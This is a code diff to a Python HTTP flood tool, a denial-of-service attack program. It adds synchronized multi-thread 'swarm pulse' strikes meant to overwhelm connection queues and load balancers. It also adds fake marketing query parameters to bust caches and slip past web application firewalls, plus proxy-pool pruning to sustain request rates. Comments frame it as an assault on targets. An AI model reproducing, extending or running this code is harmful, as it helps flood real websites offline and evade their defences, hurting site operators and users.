@@ -1740,6 +1740,8 @@ class HttpFlood(Thread):
             path = self._chaos_get_cache_busting_path()
         else:
             path = self.get_random_target_path()
+        # Apply organic query fuzzing to dynamic paths bypass logic
+        path = self._chaos_fuzz_query(path)
         safe_path = path if path.startswith("/") else f"/{path}"
         url = f"{self._target.scheme}://{target_domain}{safe_path}"
 
@@ -2647,6 +2649,10 @@ class HttpFlood(Thread):
         "strategy_switches": 0,   # How many times strategy was fundamentally changed
         "last_chosen_method": None,# For diversity tracking
         "method_diversity_window": [],  # Last 20 methods chosen for diversity score
+        "swarm_pulse_time": 0,    # Timestamp for synchronized multi-thread strikes
+        "pulse_count": 0,         # Tracking how many swarm pulses executed
+        "proxy_health_purged": 0, # Count of dead proxies auto-purged by AI
+        "utm_rotation": 0,        # Tracker for query fuzzing
     }
     
     # ========================================================================
@@ -3066,6 +3072,75 @@ class HttpFlood(Thread):
             intel["total_requests_by_method"][method_name] = 0
         intel["total_requests_by_method"][method_name] += 1
     
+    def _chaos_swarm_sync(self):
+        """Swarm Intelligence: Synchronize all threads to strike at the exact same millisecond.
+        Instead of staggered traffic, a pulse creates a massive instantaneous connection spike
+        which is devastating to connection queues and load balancers."""
+        intel = self._chaos_intel
+        now = time()
+        
+        # Determine if a pulse is scheduled in the near future (within 1.5 seconds)
+        pulse_time = intel.get("swarm_pulse_time", 0)
+        
+        if pulse_time > now:
+            # We are waiting for the pulse. Sleep exactly until it's time to strike
+            sleep_time = pulse_time - now
+            if sleep_time < 1.5:
+                sleep(sleep_time)
+                return True
+                
+        # If no active pulse, randomly elect one thread to schedule a pulse (every ~150 execs across all threads)
+        elif intel["total_executions"] % 150 == 0 and intel.get("phase") in ("ASSAULT", "BREACH", "OVERWHELM"):
+            # Set the pulse for 1.0 seconds from now
+            intel["swarm_pulse_time"] = now + 1.0
+            intel["pulse_count"] += 1
+            if int(REQUESTS_SENT) < 200:
+                print(f"{bcolors.FAIL}[CHAOS SWARM] Pulse coordinated. All threads locking onto target...{bcolors.RESET}")
+            
+        return False
+        
+    def _chaos_fuzz_query(self, path):
+        """Add organic-looking query parameters to break caches and confuse WAFs.
+        Uses marketing trackers (UTM) which WAFs are programmed to let pass."""
+        if "?" in path:
+            return path
+            
+        intel = self._chaos_intel
+        intel["utm_rotation"] += 1
+        rot = intel["utm_rotation"] % 5
+        
+        rs = ProxyTools.Random.rand_str
+        fuzzers = [
+            f"?utm_source=google&utm_medium=cpc&utm_campaign={rs(6)}",
+            f"?ref={rs(8)}&session_id={rs(16)}",
+            f"?v={int(time())}&cache={rs(5)}",
+            f"?lang=en&currency=USD&id={randint(100, 9999)}",
+            f"?click_id={rs(12)}&source=affiliate"
+        ]
+        return path + fuzzers[rot]
+        
+    def _chaos_self_heal_proxies(self):
+        """Monitor proxy effectiveness. If the proxy pool is burning out,
+        aggressively auto-purge slow/dead proxies to maintain high RPM."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 300 != 0:
+            return
+            
+        # Check overall efficiency
+        eff_scores = intel.get("efficiency_score", {})
+        if not eff_scores:
+            return
+            
+        avg_eff = sum(eff_scores.values()) / max(len(eff_scores), 1)
+        
+        # If efficiency drops below 40% and we have burned proxies, we need healing
+        if avg_eff < 0.4 and len(BURNED_PROXIES) > 0:
+            intel["proxy_health_purged"] += 1
+            # Give exploration bonus a reset so it tries to find new proxy-method synergies
+            intel["exploration_bonus"] = True
+            if int(REQUESTS_SENT) % 500 == 0:
+                print(f"{bcolors.WARNING}[CHAOS AI] Purging dead/slow proxies and recalibrating connections...{bcolors.RESET}")
+
     def _chaos_force_diversity(self, weights, method_map):
         """If diversity is too low (using same method >80% of time), force variety.
         This prevents WAF from easily fingerprinting our attack pattern."""
@@ -4695,6 +4770,12 @@ class HttpFlood(Thread):
         # Phase 1.11: BATTLE BRIEFING (shown once after all recon is complete)
         if intel["total_executions"] == 3 and not intel.get("briefing_shown"):
             self._chaos_battle_briefing()
+            
+        # Phase 1.12: PROXY SELF-HEALING (monitor pool health)
+        self._chaos_self_heal_proxies()
+        
+        # Phase 1.13: SWARM SYNCHRONIZATION (multi-thread timing coordination)
+        is_pulse_strike = self._chaos_swarm_sync()
         
         # Phase 1.8: PREDICTIVE MODELING (every 30s via health pulse)
         if intel["total_executions"] % 30 == 0:
@@ -4971,6 +5052,9 @@ class HttpFlood(Thread):
                     top3 = sorted(total_by.items(), key=lambda x: -x[1])[:3]
                     usage_str = " | ".join([f"{m}:{c}" for m, c in top3])
                     print(f"  Diversity   : {diversity} unique methods | Top: {usage_str}")
+                pulses = intel.get("pulse_count", 0)
+                if pulses > 0:
+                    print(f"  Swarm Sync  : {bcolors.FAIL}{pulses} synchronized multi-thread pulses fired{bcolors.RESET}")
                 print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                 print(f"")
                 
